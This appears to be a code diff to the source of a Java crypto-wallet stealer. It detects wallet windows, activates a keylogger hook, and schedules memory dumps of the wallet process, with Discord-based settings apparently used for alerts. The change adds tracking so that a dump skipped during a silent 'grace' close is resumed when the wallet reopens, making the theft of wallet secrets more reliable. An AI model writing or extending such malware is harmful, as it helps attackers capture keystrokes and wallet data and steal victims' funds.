@@ -36,9 +36,11 @@ final class WalletWatcher {
 	private final Object lock = new Object();
 	final Map<String, Integer> attempts = new ConcurrentHashMap<>();
 	final Map<String, Long> dumped = new ConcurrentHashMap<>();
+	final java.util.Set<String> completed = ConcurrentHashMap.newKeySet();
 	private final Map<String, Long> notified = new ConcurrentHashMap<>();
 	private volatile boolean restartKey = true;
 	int dumpSchedules;
+	int resumeSchedules;
 	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2, runnable -> {
 		Thread thread = new Thread(runnable, "spc-wallet-timer");
 		thread.setDaemon(true);
@@ -121,6 +123,7 @@ final class WalletWatcher {
 			activePid = 0L;
 			dumped.clear();
 			attempts.clear();
+			completed.clear();
 		}
 		keylogger.walletOff();
 	}
@@ -184,6 +187,7 @@ final class WalletWatcher {
 		}
 		String key = name + "|" + pid + "|" + start;
 		boolean notify;
+		boolean resume = false;
 		synchronized (lock) {
 			if (key.equals(activeKey)) {
 				return;
@@ -214,6 +218,7 @@ final class WalletWatcher {
 				// A genuinely new cycle (new key, or the same key after its
 				// cooldown) starts with a fresh attempt budget.
 				attempts.remove(key);
+				completed.remove(key);
 				state.lastWalletKey = key;
 				state.walletEvents++;
 				state.walletCooldownUntil = now + DiscordConfig.walletCooldownSec() * 1000L;
@@ -226,11 +231,18 @@ final class WalletWatcher {
 				// The popup came back after a grace close: wake the hook again
 				// but keep the cycle silent.
 				keylogger.walletOn();
+				// If the grace beat the scheduled capture, the only dump was
+				// skipped; reopen has to resume it even though the alert stays
+				// silent.
+				resume = !completed.contains(key);
 			}
 		}
 		Log.debug("Wallet detected: " + name + " pid " + pid + " title " + title);
 		if (notify) {
 			schedule(key, name, pid, 5000L);
+		} else if (resume) {
+			resumeSchedules++;
+			schedule(key, name, pid, 1000L);
 		}
 	}
 
@@ -265,6 +277,7 @@ final class WalletWatcher {
 			if (dead) {
 				dumped.remove(activeKey);
 				attempts.remove(activeKey);
+				completed.remove(activeKey);
 			}
 			activeKey = "";
 			activeName = "";
@@ -313,6 +326,9 @@ final class WalletWatcher {
 				}
 				return;
 			}
+			// A capture that produced files is complete: a later silent reopen
+			// must not schedule the same dump again.
+			completed.add(key);
 			boolean found = false;
 			for (String dump : dumps) {
 				Path file = Path.of(dump);
